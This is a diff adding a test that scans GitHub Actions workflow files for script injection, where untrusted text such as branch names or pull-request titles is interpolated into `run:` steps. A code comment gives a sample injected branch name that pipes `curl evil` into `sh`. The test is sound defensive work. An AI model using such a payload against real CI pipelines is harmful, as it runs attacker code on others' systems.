@@ -105,6 +105,32 @@ test("every workflow is valid YAML: no plain scalar holds a colon and a space, a
   if (yaml) for (const f of FILES) assert.doesNotThrow(() => yaml!.load(read(f)), `${f} does not parse`);
 });
 
+// SCRIPT INJECTION. An expression inside a `run:` body is pasted into the shell BEFORE it runs: `run: echo "${{ github.head_ref }}"` executes a branch named `a"; curl evil | sh; "`. Text that an outsider writes (a branch name,
+// a pull-request title or body, a commit message, a comment, an author name) must travel in an environment variable and be quoted in the script ("$TITLE"). The workflows of this repository run on pushes, dispatches and
+// schedules and on pull requests from the repository itself, but a pull request from a fork is exactly the case this rule is for.
+const UNTRUSTED = /github\.(?:head_ref|event\.(?:issue|pull_request|comment|review|review_comment|discussion|head_commit|pages|workflow_run\.(?:head_commit|head_branch|display_title))[\w.\[\]*]*\.(?:title|body|name|message|label|ref|email|login|head_branch|display_title)|event\.commits\[\d*\*?\]\.(?:message|author\.(?:name|email)))/;
+export function injectableRuns(src: string): string[] {
+  const out: string[] = [], lines = src.split("\n");
+  let block: number | null = null;
+  lines.forEach((line, i) => {
+    if (block !== null) { if (line.trim() === "" || /^\s*/.exec(line)![0].length > block) { if (/\$\{\{[^}]*\}\}/.test(line) && [...line.matchAll(/\$\{\{([^}]*)\}\}/g)].some((m) => UNTRUSTED.test(m[1]!))) out.push(`${i + 1}  ${line.trim().slice(0, 100)}`); return; } block = null; }
+    const m = /^(\s*)(?:-\s+)?run:\s*(.*)$/.exec(line);
+    if (!m) return;
+    const indent = m[1]!.length + (line.trimStart().startsWith("- ") ? 2 : 0), rest = m[2]!;
+    if (/^[|>][-+]?\d*\s*$/.test(rest)) { block = indent; return; }
+    if ([...rest.matchAll(/\$\{\{([^}]*)\}\}/g)].some((x) => UNTRUSTED.test(x[1]!))) out.push(`${i + 1}  ${line.trim().slice(0, 100)}`);
+  });
+  return out;
+}
+test("no `run:` step pastes text an outsider can write (branch names, titles, bodies, messages) into the shell", () => {
+  const offenders = FILES.flatMap((f) => injectableRuns(read(f)).map((o) => `${f}:${o}`));
+  assert.deepEqual(offenders, [], "pass it as `env:` and quote it in the script");
+  assert.equal(injectableRuns('      - run: echo "${{ github.head_ref }}"\n').length, 1);
+  assert.equal(injectableRuns("      - run: |\n          echo \"${{ github.event.pull_request.title }}\"\n").length, 1);
+  assert.equal(injectableRuns("      - run: |\n          echo \"$TITLE\"\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n").length, 0, "an env: value is the cure, not the disease");
+  assert.equal(injectableRuns('      - run: echo "${{ github.run_id }} ${{ github.repository }} ${{ github.sha }}"\n').length, 0, "ids and the repository name are not outsider text");
+});
+
 // GitHub refuses to start a workflow file over 512,000 bytes: every run ends in `startup_failure` before any step executes, with no message in the file's own log. RiftCompare's maintenance.yml reached 512,356 bytes and every task
 // in it was undispatchable until it was pruned. Fail at 450 KB so the next person gets a warning, not an outage.
 test("no workflow file is within 60 KB of GitHub's 512,000-byte limit", () => {
